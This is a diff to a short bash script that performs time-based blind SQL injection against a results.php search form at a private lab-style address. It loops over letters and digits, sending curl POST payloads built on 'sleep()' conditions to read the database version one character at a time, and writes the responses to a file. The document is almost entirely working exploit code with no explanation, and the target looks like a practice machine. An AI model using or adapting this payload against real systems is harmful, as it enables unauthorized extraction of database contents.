@@ -1,5 +1,8 @@
 curlfunc () { 
-    curl --silent POST -d "curl.txt" http://192.168.56.103/results.php
+    #curl --silent -XPOST --data-urlencode "search=mary' and if((select length(database@@)) = '$i',sleep(3),false) and '1'='1" http://192.168.56.103/results.php >> output
+    curl --silent -XPOST --data-urlencode "search=mary' and if((select substring(version(),$1,1)) = '$i',sleep(2),false) and '1'='1" http://192.168.56.103/results.php >> output
+    echo $i
+    echo $1
 }
 
 func="$2"
@@ -8,15 +11,15 @@ case $func in
 (*[[:alpha:]]*)
 for i in {a..z}
 do
-echo "[*] trying '$i'..."
-curlfunc "$i"
+echo "[*] trying "$i"..."
+curlfunc "$1" "$i"
 done
 ;;
 (*[![:alpha:]]*)
 for i in {0..9}
 do
-echo "[*] trying '$i'..."
-curlfunc "$i"
+echo "[*] trying "$i"..."
+curlfunc "$1" "$i"
 done
 ;;
 esac
